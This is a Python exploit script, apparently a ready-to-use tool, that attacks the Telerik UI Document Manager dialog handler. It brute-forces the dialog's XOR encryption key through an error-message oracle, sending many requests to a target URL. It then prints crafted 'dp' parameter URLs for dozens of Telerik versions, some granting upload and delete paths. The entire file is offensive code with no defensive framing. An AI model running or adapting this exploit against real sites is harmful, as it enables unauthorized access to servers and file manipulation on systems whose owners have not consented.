import sys
import base64
import requests
import re
import binascii
import argparse
import pyfiglet

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

total_requests = 0
single_char_requests = 0

# Code By Mr.SaMi 
logo = pyfiglet.figlet_format("YE EXPLOIT")
print(logo)

def create_proxy(proxy):
    return {"http": proxy, "https": proxy}

def fetch_result(plain_text, secret_key, session, padding):
    global total_requests, single_char_requests

    url = args.url
    pad_length = (len(secret_key) % 4)
    base = '' if pad_length == 0 else padding[0:4 - pad_length]
    encrypted_data = base64.b64encode((perform_encryption(plain_text, secret_key) + base).encode()).decode()
    request = requests.Request('GET', url + '?dp=' + encrypted_data)
    request = request.prepare()
    response = session.send(request, verify=False, proxies=create_proxy(args.proxy))
    total_requests += 1
    single_char_requests += 1

    match = re.search("(Error Message:)(.+\n*.+)(</div>)", response.text)
    return True if match is not None and match.group(2) == args.oracle else False

def validate_key_char(key_char, found_key, session, padding):
    base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    invalid_char = False
    accuracy_threshold = args.accuracy
    for char in range(int(accuracy_threshold)):
        sys.stdout.write("\b\b" + base64_chars[char] + "]")
        sys.stdout.flush()
        if not fetch_result(base64_chars[0] * len(found_key) + base64_chars[char], found_key + key_char, session, padding):
            invalid_char = True
            break
    return False if invalid_char else True

def perform_encryption(plain_text, secret_key):
    encrypted_data = []
    k = 0
    for i in range(len(plain_text)):
        encrypted_data.append(chr(ord(plain_text[i]) ^ ord(secret_key[k])))
        k = 0 if k >= len(secret_key) - 1 else k + 1
    return ''.join(str(e) for e in encrypted_data)

def decrypt_mode():
    cipher_text = base64.b64decode(args.ciphertext).decode()
    secret_key = args.key
    print(base64.b64decode(perform_encryption(cipher_text, secret_key)).decode())
    print("")

def encrypt_mode():
    plain_text = args.plaintext
    secret_key = args.key

    plain_text = base64.b64encode(plain_text.encode()).decode()
    print(base64.b64encode(perform_encryption(plain_text, secret_key).encode()).decode())
    print("")

def search_key_char(key_charset, unprintable_chars, found_key, session):
    padding = ''.join(chr(pad_char) for pad_char in range(256))

    for i in range(len(padding)):
        for k in range(len(key_charset)):
            key_char = key_charset[k]
            sys.stdout.write("\b"*6)
            sys.stdout.write((key_char if unprintable_chars is False else '+') + ") [" + (key_char if unprintable_chars is False else '+') + "]")
            sys.stdout.flush()
            if validate_key_char(key_char, found_key, session, padding[i] * 3):
                return key_char
    return False

def retrieve_key(session):
    global single_char_requests
    found_key = ''
    unprintable_chars = False

    key_length = args.key_len
    key_charset = args.charset
    if key_charset == 'all':
        unprintable_chars = True
        key_charset = ''.join(chr(i) for i in range(256))
    elif key_charset == 'hex':
        key_charset = '01234567890ABCDEF'

    print("Attacking " + args.url)
    print("to find key of length [" + str(key_length) + "] with accuracy threshold [" + str(args.accuracy) + "]")
    print("using key charset [" + (key_charset if unprintable_chars is False else '- all ASCII -') + "]\n")

    for i in range(int(key_length)):
        pos_str = str(i + 1) if i > 8 else "0" + str(i + 1)
        sys.stdout.write("Key position " + pos_str + ": (------")
        sys.stdout.flush()
        key_char = search_key_char(key_charset, unprintable_chars, found_key, session)
        if key_char is not False:
            found_key += key_char
            sys.stdout.write("\b"*7 + "{" + (key_char if unprintable_chars is False else '0x' + binascii.hexlify(key_char.encode()).decode()) + "} found with " + str(single_char_requests) + " requests, total so far: " + str(total_requests) + "\n")
            sys.stdout.flush()
            single_char_requests = 0
        else:
            sys.stdout.write("\b"*7 + "Not found, quitting\n")
            sys.stdout.flush()
            break

    if key_char is not False:
        print("Found key: " + (found_key if unprintable_chars is False else "(hex) " + binascii.hexlify(found_key.encode()).decode()))
    print("Total web requests: " + str(total_requests))
    return found_key

def bruteforce_key_mode():
    session = requests.Session()
    found_key = retrieve_key(session)

    if found_key == '':
        return

    urls = {}
    url_path = args.url
    params = '?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp='
    versions = [
        '2007.1423', '2007.1521', '2007.1626', '2007.2918', '2007.21010',
        '2007.21107', '2007.31218', '2007.31314', '2007.31425', '2008.1415',
        '2008.1515', '2008.1619', '2008.2723', '2008.2826', '2008.21001',
        '2008.31105', '2008.31125', '2008.31314', '2009.1311', '2009.1402',
        '2009.1527', '2009.2701', '2009.2826', '2009.31103', '2009.31208',
        '2009.31314', '2010.1309', '2010.1415', '2010.1519', '2010.2713',
        '2010.2826', '2010.2929', '2010.31109', '2010.31215', '2010.31317',
        '2011.1315', '2011.1413', '2011.1519', '2011.2712', '2011.2915',
        '2011.31115', '2011.3.1305', '2012.1.215', '2012.1.411', '2012.2.607',
        '2012.2.724', '2012.2.912', '2012.3.1016', '2012.3.1205', '2012.3.1308',
        '2013.1.220', '2013.1.403', '2013.1.417', '2013.2.611', '2013.2.717',
        '2013.3.1015', '2013.3.1114', '2013.3.1324', '2014.1.225', '2014.1.403',
        '2014.2.618', '2014.2.724', '2014.3.1024', '2015.1.204', '2015.1.225',
        '2015.1.401', '2015.2.604', '2015.2.623', '2015.2.729', '2015.2.826',
        '2015.3.930', '2015.3.1111', '2016.1.113', '2016.1.225', '2016.2.504',
        '2016.2.607', '2016.3.914', '2016.3.1018', '2016.3.1027', '2017.1.118',
        '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711', '2017.3.913'
    ]

    plaintext1 = 'EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PSxmZz09;SearchPatterns,True,0,Zmc9PQo=;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;AllowPaging,False,3,True;ViewPaths,True,0,Zmc9PQo=;FileBrowserContentProviderTypeName,False,0,,Telerik.Web.UI.Widgets.DocumentManagerContentProvider;FileBrowserDialogName,False,0,,DocumentManager;Skin,False,0,,Default;Language,False,0,,en-US;LocalizationPath,False,0,,;ExternalDialogsPath,False,0,,;'

    urls['plaintext1'] = url_path + params + base64.b64encode((perform_encryption(plaintext1, found_key)).encode()).decode()

    plaintext2 = 'AllowMultipleSelection,False,3,True;'
    urls['plaintext2'] = url_path + params + base64.b64encode((perform_encryption(plaintext1 + plaintext2, found_key)).encode()).decode()

    plaintext3 = 'EnableAsyncUpload,False,3,True;DeletePaths,True,0,;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,;SearchPatterns,True,0,;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;AllowPaging,False,3,True;ViewPaths,True,0,;FileBrowserContentProviderTypeName,False,0,,Telerik.Web.UI.Widgets.DocumentManagerContentProvider;FileBrowserDialogName,False,0,,DocumentManager;Skin,False,0,,Default;Language,False,0,,en-US;LocalizationPath,False,0,,;ExternalDialogsPath,False,0,,;'
    urls['plaintext3'] = url_path + params + base64.b64encode((perform_encryption(plaintext3, found_key)).encode()).decode()

    for i in range(len(versions)):
        urls['version_' + str(versions[i])] = url_path + params + base64.b64encode((perform_encryption(plaintext1 + 'version,' + versions[i] + ';', found_key)).encode()).decode()

    print('\n')
    for key in urls:
        print(key + ": " + urls[key])

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("-m", "--mode", required=True, help="Select the mode of operation", choices=['encrypt', 'decrypt', 'brutekey'])
    parser.add_argument("-p", "--proxy", required=False, help="Proxy IP and port")
    parser.add_argument("-u", "--url", required=False, help="URL for brutekey mode")
    parser.add_argument("-c", "--ciphertext", required=False, help="Ciphertext to decrypt")
    parser.add_argument("-k", "--key", required=False, help="Key for encryption or decryption")
    parser.add_argument("-t", "--plaintext", required=False, help="Plaintext to encrypt")
    parser.add_argument("-l", "--key-len", required=False, help="Length of the key", default=24)
    parser.add_argument("-r", "--charset", required=False, help="Character set to use for bruteforce", default="all")
    parser.add_argument("-o", "--oracle", required=False, help="Oracle string", default="the input is not valid")
    parser.add_argument("-a", "--accuracy", required=False, help="Accuracy threshold", default=8)

    args = parser.parse_args()

    if args.mode == 'decrypt':
        decrypt_mode()
    elif args.mode == 'encrypt':
        encrypt_mode()
    elif args.mode == 'brutekey':
        bruteforce_key_mode()
